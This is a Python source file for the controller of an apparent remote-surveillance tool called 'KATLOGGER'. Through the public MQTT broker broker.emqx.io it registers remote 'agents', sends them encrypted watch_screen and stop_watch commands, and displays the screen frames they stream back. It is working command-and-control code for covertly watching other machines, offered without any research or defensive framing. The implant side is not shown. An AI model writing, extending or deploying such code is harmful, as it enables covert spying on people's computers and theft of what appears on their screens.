try:
    import os, time, json, base64, uuid, threading, shlex, io
    from colorama import init, Fore
    from PIL import Image
    import cv2
    import numpy as np
    import paho.mqtt.client as mqtt
    from nacl.public import PrivateKey, PublicKey, Box
    from nacl.encoding import Base64Encoder
except ImportError as e:
    print(e)
    input("Press Enter to exit...")
    exit(1)

# --- Config ---
CONTROLLER_ID = "my_controller"
BROKER = "broker.emqx.io"
PORT = 8083
KEYFILE = "ctrl_private.key"
peers_pub = {}
selected_agents = []
frame_queue = []
screen_active = False

# --- Chiavi ---
def load_or_create_keyfile(path):
    if os.path.exists(path):
        return PrivateKey(open(path,"rb").read())
    sk = PrivateKey.generate()
    open(path,"wb").write(bytes(sk))
    return sk

sk = load_or_create_keyfile(KEYFILE)
pk_b64 = sk.public_key.encode(encoder=Base64Encoder).decode()

# --- MQTT ---
client = mqtt.Client(client_id=f"ctrl_{int(time.time())}", transport="websockets")
client.ws_set_options(path="/mqtt")

def publish_meta():
    client.publish(f"meta/{CONTROLLER_ID}", json.dumps({"pub": pk_b64}), retain=True)

def safe_send_encrypted(topic, target_pub_b64, payload_obj):
    box = Box(sk, PublicKey(target_pub_b64.encode(), encoder=Base64Encoder))
    ct = box.encrypt(json.dumps(payload_obj).encode())
    client.publish(topic, json.dumps({"from": CONTROLLER_ID, "data": base64.b64encode(ct).decode()}))

def show_frame_loop():
    global frame_queue
    while screen_active:
        if frame_queue:
            img_b64 = frame_queue.pop(0)
            try:
                img_data = base64.b64decode(img_b64)
                img = Image.open(io.BytesIO(img_data))
                img_np = np.array(img)
                img_cv = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
                cv2.imshow("Agent Screen", img_cv)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
            except Exception as e:
                print(f"Frame Visualization Error: {e}")
    cv2.destroyAllWindows()


# --- MQTT callbacks ---
def on_connect(c, u, flags, rc):
    print("MQTT connected rc", rc)
    c.subscribe(f"out/{CONTROLLER_ID}")
    c.subscribe("meta/#")
    c.subscribe(f"screen/{CONTROLLER_ID}")
    publish_meta()

def on_message(c, u, msg):
    try:
        topic = msg.topic
        payload = msg.payload.decode('utf-8')
        if topic.startswith("meta/"):
            pid = topic.split("/",1)[1]
            if pid != CONTROLLER_ID:
                obj = json.loads(payload)
                pub = obj.get("pub")
                if pub:
                    peers_pub[pid] = pub
                    print(f"[Controller] Registered agent: {pid}")
            return

        o = json.loads(payload)
        enc_b64 = o.get("data"); sender = o.get("from")
        if not enc_b64 or not sender: return
        sender_pub = peers_pub.get(sender)
        if not sender_pub: return
        box = Box(sk, PublicKey(sender_pub.encode(), encoder=Base64Encoder))
        pt = box.decrypt(base64.b64decode(enc_b64))
        obj = json.loads(pt.decode('utf-8'))

        t = obj.get("type")
        if t == "screen" and screen_active:
            frame_queue.append(obj.get("data"))
    except Exception as e:
        print(f"Error on_message: {e}")

client.on_connect = on_connect
client.on_message = on_message


client.connect(BROKER, PORT, 60)
client.loop_start()

# --- Comandi ---
def send_control_command(command):
    if not selected_agents:
        print(Fore.RED + "No agents selected!" + Fore.RESET)
        return
    req_id = str(uuid.uuid4())
    req = {"type": "control","from": CONTROLLER_ID,"id": req_id,"command": command}
    for agent_id in selected_agents:
        pub = peers_pub.get(agent_id)
        if not pub: continue
        safe_send_encrypted(f"cmd/{agent_id}", pub, req)
    print(Fore.GREEN + f"Sent '{command}' to {selected_agents}" + Fore.RESET)

# --- CLI ---
def cli_loop():
    global selected_agents, screen_active
    while True:
        try:
            cmd = input(f"KATLOGGER> ").strip()
            if cmd.startswith("agent "):
                args = cmd[6:].strip().split()
                if args[0].lower()=="all":
                    selected_agents=list(peers_pub.keys())
                else:
                    selected_agents=[a for a in args if a in peers_pub]
                print(Fore.YELLOW + f"Selected agents: {selected_agents}" + Fore.RESET)
            elif cmd.startswith("refresh"):
                print(Fore.YELLOW + "Available agents:", list(peers_pub.keys()) + Fore.RESET)
            elif cmd == "watch_screen":
                screen_active = True
                send_control_command("watch_screen")
                threading.Thread(target=show_frame_loop, daemon=True).start()
            elif cmd == "stop_watch":
                screen_active = False
                send_control_command("stop_watch")
            elif cmd in ("exit","quit"):
                screen_active = False
                break
            else:
                print("Unknown command")
        except Exception as e:
            print(Fore.RED + f"Error: {e}" + Fore.RESET)

threading.Thread(target=cli_loop, daemon=True).start()

try:
    while True: time.sleep(1)
except KeyboardInterrupt:
    screen_active = False

client.loop_stop()
client.disconnect()
